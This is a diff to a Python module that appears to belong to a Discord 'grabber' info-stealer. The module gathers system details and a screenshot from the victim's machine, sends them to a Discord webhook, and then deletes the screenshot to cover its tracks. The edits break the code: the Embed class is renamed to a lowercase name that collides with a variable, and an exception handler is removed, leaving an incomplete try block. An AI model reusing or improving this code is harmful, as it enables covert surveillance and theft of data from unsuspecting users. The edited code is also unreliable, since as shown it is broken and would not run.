@@ -7,7 +7,7 @@ import uuid
 import psutil
 import requests
 import wmi
-from discord import Embed, File, SyncWebhook
+from discord import embed, File, SyncWebhook
 from PIL import ImageGrab
 import time
 
@@ -15,7 +15,7 @@ import time
 class SystemInfo():
     def __init__(self, webhook: str) -> None:
         webhook = SyncWebhook.from_url(webhook)
-        embed = Embed(title="System Information", color=0x000000)
+        embed = embed(title="System Information", color=0x000000)
 
         embed.add_field(
             name=self.user_data()[0],
@@ -56,11 +56,10 @@ class SystemInfo():
             webhook.send(
                 embed=embed,
                 file=File('.\\screenshot.png', filename='screenshot.png'),
-                username="ALT1337",
+                username="Alt1337",
                 avatar_url="https://imgur.com/xFKcvOF"
             )
-        except:
-            pass
+        
 
         if os.path.exists("screenshot.png"):
             os.remove("screenshot.png")
